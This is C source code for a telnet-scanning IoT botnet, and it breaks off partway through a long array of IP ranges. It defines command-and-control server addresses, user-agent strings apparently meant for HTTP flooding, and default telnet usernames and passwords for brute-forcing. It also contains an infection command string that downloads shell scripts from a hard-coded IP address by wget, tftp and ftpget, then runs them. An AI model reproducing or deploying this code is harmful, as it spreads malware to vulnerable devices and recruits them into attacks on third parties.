#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define STD2_STRING "dts"
#define STD2_SIZE 50
#define BUFFER_SIZE 1024

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>


unsigned char *commServer[] =
{
        "192.156.82.47:666"//fake server
};

int server_ip1[] = {89};//real server
int server_ip2[] = {34};
int server_ip3[] = {97};
int server_ip4[] = {205};

int server_port[] = {7893};

char *useragents[] = {
		"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
		"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
		"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
		"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
		"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
		"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1"
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
		"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
		"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
		"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
		"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60"
		};


int initConnection();
int getBogos(unsigned char *bogomips);
int getCores();
int getCountry(unsigned char *buf, int bufsize);
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);

int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
int hacked = 0;
unsigned char macAddress[6] = {0};

//char *killall[] = {"arm","armv5l","armv6l","b1","b2","b3","b4","b5","b6","b7","b8","b9","busyboxterrorist","DFhxdhdf","dvrHelper","FDFDHFC","FEUB","FTUdftui","GHfjfgvj","jackmyarmv5l","jackmyarmv6l","jackmyarv6","jackmymips","jackmymipsel","jackmyx86","jhUOH","JIPJIPJj","JIPJuipjh","kmyx86_64","lolmipsel","mips","mipsel","RYrydry","telarmv6l","telmips","telmipsel","telx86","TwoFacearmv61","TwoFacei586","TwoFacei686","TwoFacem86k","TwoFacemips","TwoFacemipsel","TwoFacepowerpc","TwoFacesh4","TwoFacesparc","TwoFacex86_64","UYyuyioy","wget","x86_64","XDzdfxzf","xxb1","xxb2","xxb3","xxb4","xxb5","xxb6","xxb7","xxb8","xxb9","sh"}
//char *kill9[] = {};
char *infect = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -fr bins.sh h2.sh h3.sh h4.sh;wget http://89.34.97.205/bins.sh;chmod 777 bins.sh;sh bins.sh;tftp 89.34.97.205 -c get h3.sh;chmod 777 h3.sh;sh h3.sh;tftp -r h4.sh -g 89.34.97.205;chmod 777 h4.sh;sh h4.sh;ftpget -v -u anonymous -p anonymous -P 21 89.34.97.205 h2.sh h2.sh;sh h2.sh;rm -rf bins.sh h3.sh h4.sh h2.sh;rm -rf ami*;exit\r\n";
char *usernames[] = {"telnet\0", "root\0", "root\0", "admin\0", "root\0", "admin\0", "root\0", "admin\0"};
char *passwords[] = {"telnet\0", "\0", "root\0", "admin\0", "1234\0", "root\0", "123456\0", "1234\0"};
char* tmpdirs[] = {"/dev/netslink/", "/tmp/", "/var/", "/dev/", "/var/run/", "/dev/shm/", "/mnt/", "/boot/", "/usr/", (char*) 0};
char* advances[] = {":", "ogin", "sername", "assword", (char*)0};
char* fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};
char* successes[] = {"busybox", "$", "#", (char*)0};
char* infected[] = {"420BLAZEITFGT"};
char *infectedmessage = "420BLAZEITFGT";
char* advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
int rangesA[] = {1,100,101,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,12,120,121,122,123,124,125,126,128,13,130,131,132,133,134,136,137,138,139,14,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,2,200,201,202,203,204,205,206,207,208,209,210,211,212,213,216,217,218,219,220,221,222,223,23,24,27,30,31,36,37,38,39,4,40,41,42,43,433,45,46,47,49,5,50,51,52,54,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,8,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99};
int rangesB2[] = {10,11,160,161,171,176,177,180,183,186,188,189,190,191,192,193,195,196,198,199,20,203,205,207,22,224,226,228,229,23,231,239,24,244,245,246,247,25,251,252,253,26,28,31,32,34,36,4,48,50,53,55,56,57,58,59,60,61,62,63,69,70,71,80,85,86,9,0,1,103,108,109,127,16,160,161,17,18,187,19,2,20,205,21,22,227,23,230,231,24,248,249,25,26,27,30,31,51,65,67,68,69,73,74,81,82,83,84,95,98,99,1,14,15,16,17,192,193,194,195,197,198,2,20,203,204,205,206,207,208,209,21,210,211,212,213,214,216,217,218,219,220,224,225,228,230,231,232,233,236,238,241,242,243,245,248,249,25,250,251,252,253,254,26,30,35,38,39,42,43,44,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,66,68,69,7,70,71,72,73,74,9,155,196,199,236,247,52,104,107,130,134,146,154,155,156,157,158,159,184,186,190,208,211,224,225,226,227,228,229,235,98,105,108,109,110,113,123,124,127,16,17,186,2,32,34,35,36,37,45,51,56,58,69,7,8,80,81,82,83,87,90,192,11,242,1,102,105,108,109,110,120,121,124,125,126,127,160,161,162,163,165,166,167,168,169,184,185,187,193,194,195,197,198,200,203,225,226,228,232,233,234,235,238,50,51,59,60,61,62,63,64,66,67,80,86,87,99,102,112,116,12,122,125,136,137,138,14,143,154,155,156,157,16,166,167,172,181,182,183,187,192,194,197,198,200,201,203,204,205,206,207,212,215,216,224,225,227,228,229,230,231,235,240,242,244,246,247,248,249,250,251,252,34,35,46,47,51,52,55,66,7,77,78,80,82,86,87,93,97,0,1,112,113,118,119,120,121,122,125,128,132,136,137,142,143,144,146,162,164,167,17,170,172,173,176,177,179,181,192,194,195,201,207,222,223,226,251,34,35,38,40,50,6,69,74,75,78,79,85,88,9,91,92,93,0,1,101,102,103,108,11,112,113,114,115,116,117,118,123,132,134,16,161,162,163,164,166,168,169,170,172,173,18,185,186,192,193,194,195,196,198,199,2,20,200,201,202,203,204,205,206,207,208,209,21,210,211,216,22,220,225,226,229,23,231,233,235,236,237,238,239,24,240,241,242,244,245,246,247,248,249,25,251,252,254,26,3,37,38,39,43,44,45,5,66,67,72,76,8,82,84,86,87,92,93,95,99,0,1,101,102,104,106,108,11,110,114,115,116,117,118,119,120,121,126,127,131,133,135,137,138,139,141,143,160,161,162,163,165,166,167,168,169,171,172,173,174,175,176,177,178,179,18,181,182,184,186,188,189,190,193,195,2,205,206,21,213,219,22,220,221,223,224,225,226,227,228,229,230,231,232,233,234,235,237,238,239,24,241,243,244,248,249,25,250,26,3,34,5,56,58,6,62,65,69,7,71,74,75,76,77,8,82,84,85,86,89,9,91,93,94,95,100,101,102,108,109,134,138,139,141,143,179,199,200,205,207,216,217,218,219,220,221,223,226,228,229,231,232,233,234,235,237,238,239,240,241,246,250,252,253,30,33,35,47,69,79,81,85,87,99,108,113,117,118,127,149,151,160,161,171,176,186,192,193,195,196,197,198,199,201,202,203,204,205,206,207,208,209,210,211,213,214,215,216,218,219,220,221,222,223,224,226,227,228,229,23,230,234,235,237,239,252,40,41,42,44,45,46,48,49,50,51,52,53,54,55,56,58,59,61,62,63,64,70,85,86,87,91,96,97,98,1,101,104,11,113,116,117,118,121,123,125,127,16,17,18,19,199,202,203,207,208,210,213,226,231,240,241,248,252,26,27,28,29,30,31,5,52,55,58,6,71,72,73,74,77,93,95,96,97,99,0,1,123,13,145,146,158,16,162,168,171,173,175,177,190,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,220,221,222,223,232,239,24,240,241,242,247,248,25,252,254,26,30,33,40,43,5,53,7,71,82,83,84,86,87,90,94,95,96,100,103,118,122,124,165,173,175,181,182,183,189,200,201,21,212,213,216,217,218,219,220,221,223,248,249,250,251,253,254,32,33,34,35,36,37,39,40,41,42,43,44,47,69,71,72,74,75,76,77,79,80,81,91,93,96,1,100,102,103,108,11,115,116,117,120,121,123,124,125,126,127,129,131,132,133,135,139,140,142,15,152,154,156,157,158,159,165,166,17,176,178,179,180,181,182,183,184,185,187,189,191,194,195,199,202,203,204,224,246,249,251,4,42,49,5,50,52,53,54,56,57,60,62,7,73,75,81,82,85,86,87,9,92,93,94,96,99,107,118,119,124,125,126,127,169,175,176,196,23,238,248,250,251,252,31,45,89,9,90,91,94,0,1,10,11,124,125,14,142,144,146,157,194,197,2,205,210,212,213,214,215,216,217,218,219,237,3,32,33,35,37,4,43,5,56,57,59,60,61,62,63,68,69,7,70,74,8,82,83,86,9,1,11,119,120,121,122,125,127,128,129,130,131,132,134,135,136,137,138,139,143,147,15,152,153,154,157,159,16,161,165,168,169,17,170,171,172,175,176,177,180,182,184,186,188,19,190,204,206,21,215,217,218,222,224,225,226,229,23,230,231,234,235,236,237,238,239,24,245,25,253,27,30,34,35,45,46,52,54,57,58,62,63,78,96,97,99,100,11,117,121,128,136,138,139,140,141,142,15,151,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,183,189,191,192,194,195,2,202,225,227,230,231,232,233,236,237,239,241,243,252,254,3,4,5,52,53,54,57,64,7,70,71,73,74,75,76,78,79,82,83,84,88,89,90,91,92,94,10,100,108,109,11,111,114,12,120,122,128,13,130,131,132,133,134,135,14,145,15,153,157,158,159,16,160,162,168,17,171,174,176,179,18,181,182,187,188,189,19,191,199,20,200,201,209,214,215,22,23,230,234,235,236,237,24,245,247,248,25,252,254,26,27,28,4,5,54,55,66,68,7,73,77,8,83,9,93,97,104,105,106,107,11,112,117,118,119,120,121,122,123,124,126,128,13,131,132,134,135,146,148,152,155,158,161,163,164,165,166,169,195,197,199,200,205,224,229,234,235,238,253,28,29,41,46,64,65,66,67,7,72,73,83,90,91,92,93,94,104,107,109,112,113,114,118,121,122,124,125,126,127,132,134,138,139,153,161,162,163,165,166,167,17,211,212,215,22,227,23,234,238,24,26,31,32,33,38,40,41,42,43,44,46,47,58,62,63,72,73,75,77,78,80,83,84,85,86,90,91,92,93,94,0,140,204,46,65,68,72,211,0,108,72,248,34,236,249,35,169,59,117,118,121,19,219,68,94,97,189,204,211,213,216,5,0,100,102,104,105,106,107,108,110,111,112,113,114,115,116,118,119,121,122,124,125,126,134,135,139,141,144,146,148,149,151,157,158,159,160,161,162,164,165,167,168,169,170,171,172,173,174,175,176,177,18,181,185,187,189,191,192,20,200,201,202,203,204,208,209,210,211,217,24,25,26,27,28,31,33,36,37,40,42,43,44,45,47,48,53,63,96,97,98,99,109,112,115,120,123,130,135,136,137,250,134,196,107,108,137,202,208,12,228,48,148,185,247,66,88,204,107,140,147,101,107,129,163,0,15,16,177,20,21,232,233,234,235,237,24,25,250,252,26,27,28,29,30,31,32,33,40,41,42,45,48,49,50,51,52,53,54,55,56,60,61,62,63,64,65,66,67,70,72,73,74,75,76,77,95,168,169,170,171,172,179,231,238,242,243,244,245,246,249,250,251,252,253,254,84,0,118,142,34,36,126,69,229,198,199,201,208,209,212,213,214,119,130,86,146,20,205,253,162,169,176,177,178,202,24,246,56,243,125,142,17,179,204,27,30,47,53,77,132,143,144,130,141,142,143,148,161,210,142,249,56,60,61,62,0,1,103,187,194,196,205,228,232,90,0,1,130,158,57,150,231,84,100,101,108,109,11,111,113,114,115,116,118,120,121,122,123,124,125,211,213,216,217,218,219,224,234,247,248,249,25,35,37,38,42,44,48,49,50,61,79,8,80,82,83,9,91,96,97,98,111,26,94,173,215,225,30,89,1,100,101,106,107,111,112,113,117,118,12,120,121,136,138,139,140,143,148,149,15,150,151,153,154,16,161,162,163,165,166,168,169,17,171,172,174,18,181,192,193,194,195,197,199,2,200,201,203,204,205,206,208,21,210,211,212,213,215,22,23,3,4,42,43,49,5,100,101,102,103,104,105,106,107,108,109,110,113,114,115,116,118,119,12,120,121,122,124,125,14,15,178,192,193,194,195,209,210,212,213,214,218,219,221,226,232,234,237,239,241,33,36,40,41,42,43,48,49,50,51,56,65,67,8,80,81,82,87,96,97,98,0,1,100,101,102,103,106,11,113,114,115,118,119,124,125,126,132,133,134,135,138,139,140,141,143,145,146,147,155,156,157,158,159,16,160,161,163,168,17,174,177,179,18,182,183,188,189,19,191,192,193,194,195,196,197,199,2,200,201,202,204,205,206,207,208,21,213,22,220,223,235,238,244,26,27,3,32,33,34,35,39,4,40,41,42,43,44,45,46,47,5,52,6,61,62,63,65,66,68,69,7,70,75,76,78,8,80,82,83,87,89,9,94,95,96,97,98,99,116,117,122,124,126,129,136,137,139,141,142,143,150,151,152,156,158,159,160,161,165,166,169,183,184,185,186,187,201,204,205,206,207,210,211,212,213,214,215,216,217,219,222,223,23,234,236,237,250,33,34,35,36,38,39,42,43,44,45,46,47,50,54,64,65,66,67,68,69,70,71,72,74,75,78,90,92,93,94,95,101,102,103,104,106,110,111,114,116,119,126,129,130,131,132,133,134,135,144,147,148,149,150,151,153,154,156,157,159,160,164,165,166,170,171,172,173,174,176,177,179,180,181,182,183,184,185,187,192,197,198,199,210,211,213,214,216,218,219,222,224,226,227,228,231,233,234,236,247,252,254,4,40,42,49,51,56,57,59,80,82,84,85,87,89,91,92,93,94,97,98,99,103,104,107,108,109,112,113,114,115,116,117,118,120,121,122,123,124,125,126,129,139,143,151,160,164,167,175,180,182,188,189,211,215,241,242,243,244,245,246,248,249,250,251,252,253,254,43,64,65,67,69,70,71,87,92,93,95,0,141,143,164,165,166,167,168,170,188,192,193,197,199,200,208,210,222,223,224,226,230,231,26,27,28,29,31,42,43,46,48,52,54,57,61,64,65,66,67,93,102,107,109,111,113,114,115,116,117,119,120,121,122,123,124,125,126,127,129,140,141,146,148,156,180,184,188,189,190,191,201,202,203,204,205,206,207,237,240,241,246,247,33,34,35,37,38,39,40,41,43,44,45,50,52,54,56,57,58,59,64,65,68,69,70,71,72,73,74,75,76,77,85,86,88,91,93,0,1,100,104,105,106,107,108,109,12,128,129,13,135,138,14,141,142,144,145,147,149,15,151,152,154,157,158,161,162,163,164,165,166,167,171,179,18,184,186,188,189,19,20,205,208,209,21,211,213,216,22,224,234,238,249,25,250,254,29,31,33,35,38,40,42,44,45,46,47,49,5,50,51,52,55,56,58,63,66,67,68,69,7,70,8,81,82,83,86,87,89,9,91,94,96,97,99,103,106,108,111,117,12,120,123,145,148,16,19,21,24,27,35,36,46,48,56,57,6,69,7,71,78,86,99,103,106,109,11,112,113,114,115,116,117,118,119,12,120,124,128,129,130,134,135,137,138,139,14,148,15,151,154,155,167,177,178,179,183,188,190,192,193,194,195,200,201,204,205,206,207,208,210,212,213,214,215,216,218,219,220,221,222,225,226,227,23,233,235,236,237,241,242,243,244,247,249,251,27,36,39,46,47,5,54,56,57,59,60,61,62,65,66,67,89,9,90,92,95,0,1,101,107,108,109,11,111,113,114,115,117,119,12,120,123,126,127,13,130,131,136,137,138,139,14,141,147,15,150,153,154,155,156,157,16,160,161,172,18,180,181,183,188,190,191,192,199,20,209,28,3,34,35,36,38,4,40,41,45,5,50,53,54,55,56,57,58,59,6,60,61,62,64,65,66,7,74,75,76,78,79,89,94,95,113,114,115,116,119,120,125,127,133,136,140,153,154,155,158,159,16,161,164,165,168,17,173,18,186,19,190,191,209,210,211,212,214,215,225,227,232,233,234,237,24,240,241,242,243,244,246,25,26,27,28,3,34,38,43,59,68,72,80,93,94,0,10,100,101,102,103,105,106,107,110,111,114,12,120,122,124,129,13,14,145,146,149,15,150,155,157,158,159,162,164,169,17,173,175,176,18,181,183,186,19,203,205,208,212,218,224,237,24,244,248,25,253,26,27,29,30,31,32,34,35,39,4,41,44,46,47,48,49,5,52,54,55,57,58,59,60,61,62,63,68,69,7,70,71,72,73,74,75,76,78,80,81,82,83,84,90,96,97,98,1,10,103,107,108,109,11,110,12,121,129,130,136,137,14,140,141,142,144,145,146,147,149,15,151,153,155,165,17,171,174,175,176,180,181,182,183,185,186,188,189,19,190,191,192,193,197,201,202,204,206,207,209,211,217,218,22,225,226,232,233,234,235,236,237,238,239,24,244,245,246,247,249,25,252,253,254,27,31,4,40,42,43,45,48,49,5,50,52,56,57,6,72,74,80,82,85,9,90,91,92,95,97,0,102,103,109,11,110,13,16,176,177,178,18,181,182,183,187,188,189,19,191,193,194,195,198,199,20,202,203,206,207,209,21,210,214,22,222,223,23,24,241,243,248,249,250,251,254,26,27,31,32,33,34,37,40,54,55,6,7,8,81,82,83,84,9,98,116,117,140,154,166,19,253,42,8,0,106,107,124,125,169,192,248,251,34,68,12,135,187,44,58,138,155,158,168,19,208,238,9,98,1,20,202,206,207,210,215,216,217,218,219,221,31,44,45,46,66,68,72,129,131,148,149,220,221,228,229,245,246,44,46,47,49,50,6,81,82,87,89,93,233,27,72,135,140,141,142,143,176,177,178,179,180,181,182,183,184,185,186,187,188,190,191,192,193,194,227,229,232,235,236,32,33,38,40,45,55,60,61,62,63,68,81,90,92,0,100,101,102,103,105,106,107,109,111,112,116,117,119,121,127,129,135,138,140,141,142,144,148,149,151,153,158,159,161,163,164,165,168,169,171,175,180,181,188,19,193,195,198,199,203,204,206,207,215,216,217,218,222,223,225,236,237,238,24,248,3,32,35,52,54,58,6,7,72,75,76,8,82,84,87,91,93,96,97,0,1,10,105,11,116,117,124,13,139,14,143,144,15,152,16,163,17,179,18,184,186,187,188,19,192,193,194,195,196,197,198,199,2,20,200,201,202,203,204,205,206,207,209,211,212,213,214,216,218,22,222,226,229,23,230,235,236,237,24,240,242,248,249,25,251,252,26,27,28,29,3,32,33,34,35,4,40,41,42,43,44,47,49,50,51,52,53,54,55,57,59,6,67,68,69,73,74,75,76,77,78,8,81,86,88,9,92,93,94,95,97,103,104,107,110,127,128,134,136,137,144,146,151,163,170,177,180,189,191,38,43,44,46,47,56,57,62,71,79,83,84,91,97,98,101,109,110,116,117,118,122,123,125,130,134,141,142,150,153,162,165,175,186,187,191,192,194,205,206,210,223,229,232,253,45,92,171,179,201,232,114,121,135,40,71,10,141,145,168,177,179,199,206,228,59,104,44,101,111,152,166,180,253,45,105,121,13,16,18,181,187,19,204,205,210,212,213,216,218,220,240,252,32,50,86,90,91,92,99,104,105,106,117,119,131,137,141,143,177,178,186,195,200,202,203,205,209,213,216,220,221,223,224,229,23,232,237,238,243,245,247,25,36,44,51,53,74,103,106,116,12,120,124,125,142,143,15,150,154,156,159,164,171,174,175,178,179,20,220,235,248,252,253,26,3,33,34,66,70,85,86,90,96,108,109,110,111,132,135,14,141,145,149,153,154,155,157,164,165,167,171,184,186,19,190,193,200,207,21,216,227,228,238,242,243,248,250,254,27,33,37,45,85,88,99,132,133,135,197,199,200,206,227,254,27,36,46,51,57,59,112,117,12,128,131,132,146,15,170,194,21,219,24,31,60,64,66,78,99,0,1,102,107,11,147,148,15,157,166,2,203,205,207,21,219,22,23,235,238,239,248,250,27,29,3,31,33,37,4,46,48,52,53,54,55,56,57,59,62,63,64,65,66,67,72,73,74,76,77,84,85,86,9,90,93,94,95,109,128,130,131,132,134,136,140,143,144,149,153,154,156,157,240,248,249,64,91,92,122,123,125,127,132,156,158,161,162,163,166,167,175,176,178,179,180,184,185,186,187,190,191,199,244,247,248,66,71,79,85,88,93,94,0,11,117,12,120,121,127,132,134,144,145,150,156,160,162,164,166,174,175,179,195,197,198,201,203,205,206,209,210,211,213,215,219,222,224,226,227,229,232,233,235,246,247,3,6,7,108,110,113,116,117,118,120,121,130,132,134,135,136,137,138,139,140,141,142,152,154,160,161,165,168,170,171,172,173,174,182,184,186,189,208,209,211,212,214,216,220,232,234,236,238,242,245,246,252,253,254,34,36,37,40,42,43,48,49,54,58,59,64,75,77,79,80,81,82,83,86,91,92,94,98,99,10,106,115,14,149,152,154,155,156,158,179,214,221,222,223,242,246,27,29,30,31,64,67,71,79,8,85,86,88,89,9,90,91,95,96,97,99,153,187,209,232,234,39,87,0,1,10,100,104,105,106,109,11,114,115,116,117,119,12,125,126,128,129,13,131,135,14,149,15,150,152,153,158,159,16,17,184,188,191,192,193,194,195,196,198,199,20,202,203,204,205,206,207,209,210,211,212,214,215,216,217,218,22,220,221,222,223,225,227,23,24,25,251,26,28,29,3,30,32,34,35,36,37,4,41,42,43,44,45,5,54,72,76,8,9,96,20,128,129,13,130,131,132,134,135,14,145,148,150,155,162,163,164,168,170,171,173,18,180,181,186,200,203,206,208,211,216,221,223,23,24,25,28,29,31,4,40,41,42,43,44,47,56,59,7,8,1,101,105,107,108,109,186,248,249,32,33,36,41,42,43,49,6,68,69,71,72,73,74,75,76,77,78,79,80,81,83,85,96,97,98,99,1,106,109,112,113,114,115,117,12,122,126,128,13,130,131,132,133,140,143,145,146,147,150,151,156,158,19,203,208,21,210,216,218,221,229,23,230,235,236,237,238,239,254,26,38,52,53,54,55,57,6,60,70,76,78,79,8,98,120,76,88,94,113,114,117,119,148,149,150,151,162,163,165,167,170,172,173,177,182,183,190,191,34,56,65,67,68,72,73,74,75,77,79,80,81,83,84,85,86,88,90,30,0,104,107,109,133,138,140,141,142,143,144,145,146,147,148,150,151,158,159,160,161,162,169,174,184,186,188,189,191,192,207,208,209,214,215,217,220,221,222,225,230,242,246,247,248,249,250,252,253,32,33,38,41,67,69,71,77,78,79,82,83,87,97,100,101,103,104,113,115,117,119,201,224,225,226,227,228,229,230,231,232,233,234,235,237,239,248,52,55,57,58,59,6,61,63,7,82,84,85,88,94,97,224,228,230,231,233,239,245,246,247,248,249,250,251,252,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,216,217,218,219,248,249,251,252,31,33,61,64,74,0,1,10,100,102,109,116,118,119,128,13,143,146,149,150,158,159,160,161,170,173,174,18,182,183,185,186,188,19,191,2,200,201,203,209,21,210,214,218,219,225,226,228,23,232,233,237,238,239,240,244,245,249,250,251,253,28,29,30,32,35,37,39,41,42,43,44,45,48,52,55,59,60,61,63,70,72,73,77,97,98,197,200,203,59,60,72,1,112,114,115,116,117,119,124,136,142,143,144,145,146,147,148,149,150,151,156,204,205,206,207,228,245,248,253,65,66,68,69,70,72,74,75,76,77,81,82,83,84,85,87,88,89,91,11,12,13,136,137,138,139,14,140,141,142,143,145,148,15,154,158,160,164,165,166,167,172,178,185,19,197,199,2,200,202,205,219,220,221,222,223,227,229,232,233,234,235,236,237,238,239,248,25,254,26,27,3,34,35,42,43,44,53,62,74,75,76,79,83,95,0,122,167,200,201,203,204,205,206,207,224,225,233,234,235,242,248,252,73,235,166,196,210,11,120,121,122,124,125,136,137,140,141,17,179,18,185,186,187,208,209,210,211,212,213,214,215,218,22,220,221,222,230,243,244,245,246,253,27,30,46,49,51,55,57,58,59,60,71,82,84,97,0,1,10,100,103,11,12,120,127,13,135,14,15,152,153,161,174,176,177,178,18,180,181,182,183,184,19,21,23,24,25,29,3,30,32,34,35,39,4,40,41,44,45,48,5,50,54,55,56,57,60,62,7,8,84,85,86,88,89,90,91,92,93,94,95,96,97,98,99,0,1,13,14,16,160,162,163,166,167,170,171,172,173,174,175,176,177,178,179,18,184,185,186,187,188,19,190,209,210,214,218,219,22,223,23,234,235,241,242,243,249,25,251,253,254,29,3,4,5,51,6,8,9,0,1,102,106,109,12,123,129,130,131,134,138,141,143,145,146,148,152,158,16,160,163,168,172,174,175,177,